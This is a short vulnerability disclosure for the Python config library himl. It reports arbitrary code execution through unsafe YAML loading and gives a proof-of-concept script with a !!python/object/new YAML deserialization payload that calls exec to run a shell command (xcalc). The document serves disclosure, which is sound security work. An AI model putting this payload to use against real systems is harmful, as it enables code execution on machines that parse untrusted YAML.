# Description

`himl` is a hierarchical config using yaml in Python, which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip install himl
```

### Run exploit.py
```
import os
#os.system('pip install himl')
from himl import config_generator
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('pwn.yml','w+').write(exploit)
config_generator.ConfigGenerator.yaml_get_content('pwn.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
